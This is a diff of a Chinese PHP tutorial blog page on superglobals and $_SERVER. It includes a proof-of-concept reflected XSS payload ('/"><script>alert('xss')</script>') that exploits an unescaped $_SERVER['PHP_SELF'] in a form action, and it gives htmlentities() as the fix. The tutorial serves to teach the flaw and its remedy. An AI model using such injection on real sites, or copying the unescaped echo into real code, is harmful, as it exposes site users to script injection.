@@ -16,12 +16,12 @@
 
 
 
-    <meta name="description" content="1、超级全局变量超级全局变量在PHP 4.1.0之后被启用, 是PHP系统中自带的变量，在一个脚本的全部作用域中都可用。$_SERVER[“PHP_SELF”]; PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。">
+    <meta name="description" content="1&amp;#x3001;&amp;#x8D85;&amp;#x7EA7;&amp;#x5168;&amp;#x5C40;&amp;#x53D8;&amp;#x91CF;&amp;#x8D85;&amp;#x7EA7;&amp;#x5168;&amp;#x5C40;&amp;#x53D8;&amp;#x91CF;&amp;#x5728;PHP 4.1.0&amp;#x4E4B;&amp;#x540E;&amp;#x88AB;&amp;#x542F;&amp;#x7528;, &amp;#x662F;PHP&amp;#x7CFB;&amp;#x7EDF;&amp;#x4E2D;&amp;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php特性">
 <meta property="og:url" content="http://example.com/2019/04/11/PHP%E7%89%B9%E6%80%A7/index.html">
 <meta property="og:site_name" content="ShuYu">
-<meta property="og:description" content="1、超级全局变量超级全局变量在PHP 4.1.0之后被启用, 是PHP系统中自带的变量，在一个脚本的全部作用域中都可用。$_SERVER[“PHP_SELF”]; PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。">
+<meta property="og:description" content="1&amp;#x3001;&amp;#x8D85;&amp;#x7EA7;&amp;#x5168;&amp;#x5C40;&amp;#x53D8;&amp;#x91CF;&amp;#x8D85;&amp;#x7EA7;&amp;#x5168;&amp;#x5C40;&amp;#x53D8;&amp;#x91CF;&amp;#x5728;PHP 4.1.0&amp;#x4E4B;&amp;#x540E;&amp;#x88AB;&amp;#x542F;&amp;#x7528;, &amp;#x662F;PHP&amp;#x7CFB;&amp;#x7EDF;&amp;#x4E2D;&amp;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2019/04/11/PHP%E7%89%B9%E6%80%A7/1.png">
 <meta property="og:image" content="http://example.com/2019/04/11/PHP%E7%89%B9%E6%80%A7/2.png">
@@ -53,10 +53,10 @@
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
 
 
-<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-dark.min.css">
 
 
-<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="../../../../css/style.css">
 
 
 <script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
@@ -82,9 +82,9 @@
 <nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
     <div class="container">
         <div class="navbar-brand">
-            <a class="navbar-item navbar-logo" href="/">
+            <a class="navbar-item navbar-logo" href="../../../../index.html">
                 
-                <img src="/images/logo.png" alt="" height="28">
+                <img src="../../../../images/logo.png" alt="" height="28">
                 
             </a>
             <div class="navbar-burger">
@@ -97,16 +97,16 @@
         <div class="navbar-menu navbar-start">
             
             <a class="navbar-item "
-               href="/archives">Archives</a>
+               href="../../../../archives">Archives</a>
             
             <a class="navbar-item "
-               href="/friends">Friends</a>
+               href="../../../../friends">Friends</a>
             
             <a class="navbar-item "
-               href="/about">About</a>
+               href="../../../../about">About</a>
             
             <a class="navbar-item "
-               href="/tags">Tags</a>
+               href="../../../../tags">Tags</a>
             
         </div>
         
@@ -140,13 +140,13 @@
     <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
         <span class="column is-narrow">
             
-                <span>Apr 11 2019</span>
+                <time datetime="2019-04-11T13:01:54.000Z" itemprop="datePublished">Apr 11 2019</time>
             
         </span>
         
         <span class="column is-narrow article-category">
             <i class="far fa-folder"></i>
-            <a class="article-category-link" href="/categories/Web/">Web</a>
+            <a class="article-category-link" href="../../../../categories/Web/">Web</a>
         </span>
         
         
@@ -159,172 +159,172 @@
     </div>
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-        <h4 id="1、超级全局变量"><a href="#1、超级全局变量" class="headerlink" title="1、超级全局变量"></a>1、超级全局变量</h4><p>超级全局变量在PHP 4.1.0之后被启用, 是PHP系统中自带的变量，在一个脚本的全部作用域中都可用。<br>$_SERVER[“PHP_SELF”];</p>
-<h4 id="PHP中预定义了几个超级全局变量（superglobals）-，这意味着它们在一个脚本的全部作用域中都可用。-你不需要特别说明，就可以在函数及类中使用。"><a href="#PHP中预定义了几个超级全局变量（superglobals）-，这意味着它们在一个脚本的全部作用域中都可用。-你不需要特别说明，就可以在函数及类中使用。" class="headerlink" title="PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。"></a>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。</h4><a id="more"></a>
+        <html><head></head><body><h4 id="1&#x3001;&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;"><a href="#1&#x3001;&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;" class="headerlink" title="1&#x3001;&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;"></a>1&#x3001;&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;</h4><p>&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x5728;PHP 4.1.0&#x4E4B;&#x540E;&#x88AB;&#x542F;&#x7528;, &#x662F;PHP&#x7CFB;&#x7EDF;&#x4E2D;&#x81EA;&#x5E26;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x5168;&#x90E8;&#x4F5C;&#x7528;&#x57DF;&#x4E2D;&#x90FD;&#x53EF;&#x7528;&#x3002;<br>$_SERVER[&#x201C;PHP_SELF&#x201D;];</p>
+<h4 id="PHP&#x4E2D;&#x9884;&#x5B9A;&#x4E49;&#x4E86;&#x51E0;&#x4E2A;&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF08;superglobals&#xFF09;-&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5B83;&#x4EEC;&#x5728;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x5168;&#x90E8;&#x4F5C;&#x7528;&#x57DF;&#x4E2D;&#x90FD;&#x53EF;&#x7528;&#x3002;-&#x4F60;&#x4E0D;&#x9700;&#x8981;&#x7279;&#x522B;&#x8BF4;&#x660E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x51FD;&#x6570;&#x53CA;&#x7C7B;&#x4E2D;&#x4F7F;&#x7528;&#x3002;"><a href="#PHP&#x4E2D;&#x9884;&#x5B9A;&#x4E49;&#x4E86;&#x51E0;&#x4E2A;&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF08;superglobals&#xFF09;-&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5B83;&#x4EEC;&#x5728;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x5168;&#x90E8;&#x4F5C;&#x7528;&#x57DF;&#x4E2D;&#x90FD;&#x53EF;&#x7528;&#x3002;-&#x4F60;&#x4E0D;&#x9700;&#x8981;&#x7279;&#x522B;&#x8BF4;&#x660E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x51FD;&#x6570;&#x53CA;&#x7C7B;&#x4E2D;&#x4F7F;&#x7528;&#x3002;" class="headerlink" title="PHP&#x4E2D;&#x9884;&#x5B9A;&#x4E49;&#x4E86;&#x51E0;&#x4E2A;&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF08;superglobals&#xFF09; &#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5B83;&#x4EEC;&#x5728;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x5168;&#x90E8;&#x4F5C;&#x7528;&#x57DF;&#x4E2D;&#x90FD;&#x53EF;&#x7528;&#x3002; &#x4F60;&#x4E0D;&#x9700;&#x8981;&#x7279;&#x522B;&#x8BF4;&#x660E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x51FD;&#x6570;&#x53CA;&#x7C7B;&#x4E2D;&#x4F7F;&#x7528;&#x3002;"></a>PHP&#x4E2D;&#x9884;&#x5B9A;&#x4E49;&#x4E86;&#x51E0;&#x4E2A;&#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF08;superglobals&#xFF09; &#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5B83;&#x4EEC;&#x5728;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x5168;&#x90E8;&#x4F5C;&#x7528;&#x57DF;&#x4E2D;&#x90FD;&#x53EF;&#x7528;&#x3002; &#x4F60;&#x4E0D;&#x9700;&#x8981;&#x7279;&#x522B;&#x8BF4;&#x660E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x51FD;&#x6570;&#x53CA;&#x7C7B;&#x4E2D;&#x4F7F;&#x7528;&#x3002;</h4><a id="more"></a>
 
 
-<p>PHP 超级全局变量列表:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. $GLOBALS</span><br><span class="line">2. $_SERVER</span><br><span class="line">3. $_REQUEST</span><br><span class="line">4. $_POST</span><br><span class="line">5. $_GET</span><br><span class="line">6. $_FILES</span><br><span class="line">7. $_ENV</span><br><span class="line">8. $_COOKIE</span><br><span class="line">9. $_SESSION</span><br></pre></td></tr></table></figure>
+<p>PHP &#x8D85;&#x7EA7;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x5217;&#x8868;:</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">1. $GLOBALS<br>2. $_SERVER<br>3. $_REQUEST<br>4. $_POST<br>5. $_GET<br>6. $_FILES<br>7. $_ENV<br>8. $_COOKIE<br>9. $_SESSION<br></code></pre></td></tr></tbody></table></figure>
 
-<h4 id="2、PHP-SERVER"><a href="#2、PHP-SERVER" class="headerlink" title="2、PHP $_SERVER"></a>2、PHP $_SERVER</h4><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo $_SERVER[&#39;PHP_SELF&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;SERVER_NAME&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;HTTP_HOST&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $_SERVER[&#39;SCRIPT_NAME&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="2&#x3001;PHP-SERVER"><a href="#2&#x3001;PHP-SERVER" class="headerlink" title="2&#x3001;PHP $_SERVER"></a>2&#x3001;PHP $_SERVER</h4><p>$_SERVER &#x662F;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x4E86;&#x8BF8;&#x5982;&#x5934;&#x4FE1;&#x606F;(header)&#x3001;&#x8DEF;&#x5F84;(path)&#x3001;&#x4EE5;&#x53CA;&#x811A;&#x672C;&#x4F4D;&#x7F6E;(script locations)&#x7B49;&#x7B49;&#x4FE1;&#x606F;&#x7684;&#x6570;&#x7EC4;&#x3002;&#x8FD9;&#x4E2A;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x9879;&#x76EE;&#x7531; Web &#x670D;&#x52A1;&#x5668;&#x521B;&#x5EFA;&#x3002;&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x63D0;&#x4F9B;&#x5168;&#x90E8;&#x9879;&#x76EE;&#xFF1B;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x80FD;&#x4F1A;&#x5FFD;&#x7565;&#x4E00;&#x4E9B;&#xFF0C;&#x6216;&#x8005;&#x63D0;&#x4F9B;&#x4E00;&#x4E9B;&#x6CA1;&#x6709;&#x5728;&#x8FD9;&#x91CC;&#x5217;&#x4E3E;&#x51FA;&#x6765;&#x7684;&#x9879;&#x76EE;&#x3002;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php <br>echo $_SERVER[&apos;PHP_SELF&apos;];<br>echo &quot;&lt;br&gt;&quot;;<br>echo $_SERVER[&apos;SERVER_NAME&apos;];<br>echo &quot;&lt;br&gt;&quot;;<br>echo $_SERVER[&apos;HTTP_HOST&apos;];<br>echo &quot;&lt;br&gt;&quot;;<br>echo $_SERVER[&apos;HTTP_REFERER&apos;];<br>echo &quot;&lt;br&gt;&quot;;<br>echo $_SERVER[&apos;HTTP_USER_AGENT&apos;];<br>echo &quot;&lt;br&gt;&quot;;<br>echo $_SERVER[&apos;SCRIPT_NAME&apos;];<br>?&gt;<br></code></pre></td></tr></tbody></table></figure>
 
-<h4 id="3、-SERVER-’PHP-SELF’-的跨站脚本攻击"><a href="#3、-SERVER-’PHP-SELF’-的跨站脚本攻击" class="headerlink" title="3、$_SERVER[’PHP_SELF’]的跨站脚本攻击"></a>3、$_SERVER[’PHP_SELF’]的跨站脚本攻击</h4><p>$_SERVER[‘PHP_SELF’]是PHP语言中的“服务器端系统变量”，它的值是当前php文件相对于网站根目录的位置地址.<br>比如当</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $_SERVER[&#39;PHP_SELF&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>正常访问是这样的<br><img src="1.png"><br>显然这样可以很方便XSS，因为直接echo在页面上，所以只需要在尾部加上<code>/&lt;script&gt;alert(&quot;Hello&quot;)&lt;/script&gt;</code>即可，建议大家先URL加密一次，不过问题不大<br><img src="2.png"><br>当然正常的代码不会直接输出在界面上，但是当开发人员一个表单的在action本页面，则可能会</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot;method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">.....</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
-<p>正常访问是这样的</p>
+<h4 id="3&#x3001;-SERVER-&#x2019;PHP-SELF&#x2019;-&#x7684;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;"><a href="#3&#x3001;-SERVER-&#x2019;PHP-SELF&#x2019;-&#x7684;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;" class="headerlink" title="3&#x3001;$_SERVER[&#x2019;PHP_SELF&#x2019;]&#x7684;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;"></a>3&#x3001;$_SERVER[&#x2019;PHP_SELF&#x2019;]&#x7684;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;</h4><p>$_SERVER[&#x2018;PHP_SELF&#x2019;]&#x662F;PHP&#x8BED;&#x8A00;&#x4E2D;&#x7684;&#x201C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7CFB;&#x7EDF;&#x53D8;&#x91CF;&#x201D;&#xFF0C;&#x5B83;&#x7684;&#x503C;&#x662F;&#x5F53;&#x524D;php&#x6587;&#x4EF6;&#x76F8;&#x5BF9;&#x4E8E;&#x7F51;&#x7AD9;&#x6839;&#x76EE;&#x5F55;&#x7684;&#x4F4D;&#x7F6E;&#x5730;&#x5740;.<br>&#x6BD4;&#x5982;&#x5F53;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br>echo $_SERVER[&apos;PHP_SELF&apos;];<br>?&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#x662F;&#x8FD9;&#x6837;&#x7684;<br><img src="1.png"><br>&#x663E;&#x7136;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;XSS&#xFF0C;&#x56E0;&#x4E3A;&#x76F4;&#x63A5;echo&#x5728;&#x9875;&#x9762;&#x4E0A;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x9700;&#x8981;&#x5728;&#x5C3E;&#x90E8;&#x52A0;&#x4E0A;<code>/&lt;script&gt;alert(&quot;Hello&quot;)&lt;/script&gt;</code>&#x5373;&#x53EF;&#xFF0C;&#x5EFA;&#x8BAE;&#x5927;&#x5BB6;&#x5148;URL&#x52A0;&#x5BC6;&#x4E00;&#x6B21;&#xFF0C;&#x4E0D;&#x8FC7;&#x95EE;&#x9898;&#x4E0D;&#x5927;<br><img src="2.png"><br>&#x5F53;&#x7136;&#x6B63;&#x5E38;&#x7684;&#x4EE3;&#x7801;&#x4E0D;&#x4F1A;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5728;&#x754C;&#x9762;&#x4E0A;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x4E00;&#x4E2A;&#x8868;&#x5355;&#x7684;&#x5728;action&#x672C;&#x9875;&#x9762;&#xFF0C;&#x5219;&#x53EF;&#x80FD;&#x4F1A;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;form action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot;method=&quot;POST&quot;&gt;<br>.....<br>&lt;/form&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>&#x6B63;&#x5E38;&#x8BBF;&#x95EE;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
 <p><img src="3.png"></p>
-<p>但是 当你在尾部加上</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>则由原来生成的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;demo.php&#x2F;&#123;&#123;多加入的参数&#125;&#125;&quot; method&#x3D;&quot;POST&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>变成了，符号是自己加上去，表示区分</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;demo.php&#x2F;&#123;&#123;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&#125;&#125;&quot; method&#x3D;&quot;POST&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>最终</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;demo.php&#x2F;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot; method&#x3D;&quot;POST&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>成功执行了XSS<br><img src="4.png"><br><img src="5.png"></p>
-<h4 id="3-1、解决办法-gt-通过htmlentities-SERVER-‘PHP-SELF’-过滤"><a href="#3-1、解决办法-gt-通过htmlentities-SERVER-‘PHP-SELF’-过滤" class="headerlink" title="3.1、解决办法-&gt; 通过htmlentities($_SERVER[‘PHP_SELF’]);过滤"></a>3.1、解决办法-&gt; 通过htmlentities($_SERVER[‘PHP_SELF’]);过滤</h4><h4 id="PS-SERVER-变量中的重要元素"><a href="#PS-SERVER-变量中的重要元素" class="headerlink" title="PS:$_SERVER 变量中的重要元素:"></a>PS:$_SERVER 变量中的重要元素:</h4><table>
+<p>&#x4F46;&#x662F; &#x5F53;&#x4F60;&#x5728;&#x5C3E;&#x90E8;&#x52A0;&#x4E0A;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>&#x5219;&#x7531;&#x539F;&#x6765;&#x751F;&#x6210;&#x7684;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;form action=&quot;/demo.php/{{&#x591A;&#x52A0;&#x5165;&#x7684;&#x53C2;&#x6570;}}&quot; method=&quot;POST&quot;&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>&#x53D8;&#x6210;&#x4E86;&#xFF0C;&#x7B26;&#x53F7;&#x662F;&#x81EA;&#x5DF1;&#x52A0;&#x4E0A;&#x53BB;&#xFF0C;&#x8868;&#x793A;&#x533A;&#x5206;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;form action=&quot;/demo.php/{{&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;}}&quot; method=&quot;POST&quot;&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>&#x6700;&#x7EC8;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;form action=&quot;/demo.php/&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot; method=&quot;POST&quot;&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>&#x6210;&#x529F;&#x6267;&#x884C;&#x4E86;XSS<br><img src="4.png"><br><img src="5.png"></p>
+<h4 id="3-1&#x3001;&#x89E3;&#x51B3;&#x529E;&#x6CD5;-gt-&#x901A;&#x8FC7;htmlentities-SERVER-&#x2018;PHP-SELF&#x2019;-&#x8FC7;&#x6EE4;"><a href="#3-1&#x3001;&#x89E3;&#x51B3;&#x529E;&#x6CD5;-gt-&#x901A;&#x8FC7;htmlentities-SERVER-&#x2018;PHP-SELF&#x2019;-&#x8FC7;&#x6EE4;" class="headerlink" title="3.1&#x3001;&#x89E3;&#x51B3;&#x529E;&#x6CD5;-&gt; &#x901A;&#x8FC7;htmlentities($_SERVER[&#x2018;PHP_SELF&#x2019;]);&#x8FC7;&#x6EE4;"></a>3.1&#x3001;&#x89E3;&#x51B3;&#x529E;&#x6CD5;-&gt; &#x901A;&#x8FC7;htmlentities($_SERVER[&#x2018;PHP_SELF&#x2019;]);&#x8FC7;&#x6EE4;</h4><h4 id="PS-SERVER-&#x53D8;&#x91CF;&#x4E2D;&#x7684;&#x91CD;&#x8981;&#x5143;&#x7D20;"><a href="#PS-SERVER-&#x53D8;&#x91CF;&#x4E2D;&#x7684;&#x91CD;&#x8981;&#x5143;&#x7D20;" class="headerlink" title="PS:$_SERVER &#x53D8;&#x91CF;&#x4E2D;&#x7684;&#x91CD;&#x8981;&#x5143;&#x7D20;:"></a>PS:$_SERVER &#x53D8;&#x91CF;&#x4E2D;&#x7684;&#x91CD;&#x8981;&#x5143;&#x7D20;:</h4><table>
 <thead>
 <tr>
-<th>元素/代码</th>
-<th>描述</th>
+<th>&#x5143;&#x7D20;/&#x4EE3;&#x7801;</th>
+<th>&#x63CF;&#x8FF0;</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>$_SERVER[‘PHP_SELF’]</td>
-<td>返回当前执行脚本的文件名。</td>
+<td>$_SERVER[&#x2018;PHP_SELF&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x6267;&#x884C;&#x811A;&#x672C;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘GATEWAY_INTERFACE’]</td>
-<td>返回服务器使用的 CGI 规范的版本。</td>
+<td>$_SERVER[&#x2018;GATEWAY_INTERFACE&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x7684; CGI &#x89C4;&#x8303;&#x7684;&#x7248;&#x672C;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SERVER_ADDR’]</td>
-<td>返回当前运行脚本所在的服务器的 IP 地址。</td>
+<td>$_SERVER[&#x2018;SERVER_ADDR&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x8FD0;&#x884C;&#x811A;&#x672C;&#x6240;&#x5728;&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684; IP &#x5730;&#x5740;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SERVER_NAME’]</td>
-<td>返回当前运行脚本所在的服务器的主机名。</td>
+<td>$_SERVER[&#x2018;SERVER_NAME&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x8FD0;&#x884C;&#x811A;&#x672C;&#x6240;&#x5728;&#x7684;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SERVER_SOFTWARE’]</td>
-<td>返回服务器标识字符串（比如 Apache/2.2.24）。</td>
+<td>$_SERVER[&#x2018;SERVER_SOFTWARE&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x670D;&#x52A1;&#x5668;&#x6807;&#x8BC6;&#x5B57;&#x7B26;&#x4E32;&#xFF08;&#x6BD4;&#x5982; Apache/2.2.24&#xFF09;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘SERVER_PROTOCOL’]</td>
-<td>返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。</td>
+<td>$_SERVER[&#x2018;SERVER_PROTOCOL&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x8BF7;&#x6C42;&#x9875;&#x9762;&#x65F6;&#x901A;&#x4FE1;&#x534F;&#x8BAE;&#x7684;&#x540D;&#x79F0;&#x548C;&#x7248;&#x672C;&#xFF08;&#x4F8B;&#x5982;&#xFF0C;&#x201C;HTTP/1.0&#x201D;&#xFF09;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘REQUEST_METHOD’]</td>
-<td>返回访问页面使用的请求方法（例如 POST）。</td>
+<td>$_SERVER[&#x2018;REQUEST_METHOD&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x8BBF;&#x95EE;&#x9875;&#x9762;&#x4F7F;&#x7528;&#x7684;&#x8BF7;&#x6C42;&#x65B9;&#x6CD5;&#xFF08;&#x4F8B;&#x5982; POST&#xFF09;&#x3002;</td>
 </tr>
 <tr>
-<td>$_SERVER[‘REQUEST_TIME’]</td>
-<td>返回请求开始时的时间戳（例如 1577687494）。</td>
+<td>$_SERVER[&#x2018;REQUEST_TIME&#x2019;]</td>
+<td>&#x8FD4;&#x56DE;&#x8BF7;&#x6C42;&#x5F00;&#x59CB;&#x65F6;&#x7684;&#x65F6;&#x95F4;&#x6233;&#xFF08;&#x4F8B;&#x5982; 1577687494&#xFF09;&#x3002;</td>
 </tr>
